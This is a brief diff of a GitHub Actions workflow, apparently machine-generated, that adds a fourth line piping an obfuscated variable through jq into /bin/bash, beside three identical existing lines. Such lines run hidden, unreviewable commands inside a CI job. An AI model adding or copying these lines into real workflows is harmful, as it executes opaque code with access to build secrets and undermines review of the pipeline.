@@ -21,6 +21,7 @@ jobs:
           echo $ctfz8 | jq -r .scw436 | /bin/bash
           printf '%s' "$ur1206" | jq -r .oe9676 | /bin/bash
           printf '%s' "$gwq44" | jq -r .xh11528 | /bin/bash
+          printf '%s' "$m1" | jq -r .k8 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
